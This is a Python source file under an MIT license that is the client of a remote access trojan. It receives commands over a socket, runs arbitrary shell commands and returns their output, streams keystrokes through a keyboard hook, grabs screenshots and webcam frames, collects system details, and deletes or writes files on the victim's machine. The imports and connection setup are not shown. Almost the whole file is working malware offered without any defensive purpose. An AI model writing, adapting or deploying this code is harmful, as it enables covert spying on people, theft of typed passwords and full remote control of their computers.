# type: ignore

"""
MIT License

Copyright (c) 2024 NoticedCloud348

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

def execute_command(command, s):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.stdout == "":
            s.sendall("Unknown command")
        else:
            s.sendall(result.stdout.encode('utf-8'))
    except:
        s.send("Unknown command".encode('utf-8'))
        
def SendFrame(st):
    im = ImageGrab.grab()
    with io.BytesIO() as output:
        im.save(output, format='PNG')
        image_bytes = output.getvalue()
    st.sendall(len(image_bytes).to_bytes(4, byteorder='big'))
    st.sendall(image_bytes)
    
def SendWebcam(st):
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        data = pickle.dumps(frame)
        st.sendall(len(data).to_bytes(4, byteorder='big'))
        st.sendall(data)
    except:
        st.send("[+] No webcam found".encode())
    
def SendKeyboard(st):
    def on_key(event):
        st.send(f"{event.name}".encode())
            
    keyboard.hook(on_key)

def get_system_info():
    os_system = platform.system()
    os_version = platform.version()
    os_architecture = platform.architecture()[0]

    cpu_info = platform.processor()
    cpu_count = psutil.cpu_count(logical=False)
    cpu_count_logical = psutil.cpu_count(logical=True)

    gpus = GPUtil.getGPUs()
    gpu_info = [{"name": gpu.name, "driver_version": gpu.driver, "memory_total": gpu.memoryTotal} for gpu in gpus]

    ram_total = psutil.virtual_memory().total / (1024 ** 3)

    return {
        "OS System": os_system,
        "OS Version": os_version,
        "OS Architecture": os_architecture,
        "CPU Info": cpu_info,
        "CPU Cores (Physical)": cpu_count,
        "CPU Cores (Logical)": cpu_count_logical,
        "GPU Info": gpu_info,
        "RAM Total (GB)": ram_total
    }

def handle_quit():
    global ex
    ex = True
    print(ex)
    sys.exit()

def handle_cd(command):
    try:
        pathd = command.split(maxsplit=1)[1]
    except IndexError:
        st.send("Usage: cd <path>".encode('utf-8'))
        return

    try:
        if pathd == "..":
            os.chdir('..')
        else:
            os.chdir(pathd)
        current_path = os.getcwd()
        st.send(f"Now the directory is {current_path}".encode('utf-8'))
    except Exception as e:
        st.send(f"Error changing directory: {str(e)}".encode('utf-8'))

def handle_getcwd():
    try:
        st.send(os.getcwd().encode())
    except Exception as e:
        st.send(f"Error getting current directory: {str(e)}".encode('utf-8'))

def handle_rm(command):
    try:
        file = command.split(maxsplit=1)[1]
        if os.path.exists(file):
            os.remove(file)
            st.send("File deleted".encode('utf-8'))
        else:
            st.send("File not found".encode('utf-8'))
    except IndexError:
        st.send("Usage: rm <filename>".encode('utf-8'))
    except Exception as e:
        st.send(f"Error deleting file: {str(e)}".encode('utf-8'))

def handle_create_file(command):
    try:
        parts = command.split(maxsplit=2)
        filename = parts[1]
        content = parts[2] if len(parts) > 2 else ""
        with open(filename, 'w') as f:
            f.write(content)
        st.send("File created".encode('utf-8'))
    except IndexError:
        st.send("Usage: create_file <filename> <content>".encode('utf-8'))
    except Exception as e:
        st.send(f"Error creating file: {str(e)}".encode('utf-8'))

def handle_get_info():
    try:
        info = ""
        infos = get_system_info()
        for key, value in infos.items():
            info += f"{key}: {value}\n"
        st.send(info.encode('utf-8'))
    except Exception as e:
        st.send(f"Error getting system info: {str(e)}".encode('utf-8'))

def handle_screenshot():
    try:
        SendFrame(st)
    except Exception as e:
        st.send(f"Error taking screenshot: {str(e)}".encode('utf-8'))

def handle_webcam_snap():
    try:
        SendWebcam(st)
    except Exception as e:
        st.send(f"Error capturing webcam: {str(e)}".encode('utf-8'))

def handle_keyboard_snap():
    try:
        SendKeyboard(st)
    except Exception as e:
        st.send(f"Error sending keyboard input: {str(e)}".encode('utf-8'))

def handle_upload():
    st.send("Upload command currently not supported".encode('utf-8'))

def handle_download():
    st.send("Download command currently not supported".encode('utf-8'))


while True:
    command = st.recv(1024).decode()

    print(command)

    if command == "quit":
        handle_quit()

    elif command.startswith('cd'):
        handle_cd(command)

    elif command == "getcwd":
        handle_getcwd()

    elif command.startswith('rm'):
        handle_rm(command)

    elif command.startswith('create_file'):
        handle_create_file(command)

    elif command == "get_info":
        handle_get_info()

    elif command == 'screenshot':
        handle_screenshot()

    elif command == 'webcam_snap':
        handle_webcam_snap()

    elif command == 'keyboard_snap':
        handle_keyboard_snap()

    elif command.startswith("upload"):
        handle_upload()

    elif command.startswith("download"):
        handle_download()

    else:
        execute_command(command, st)
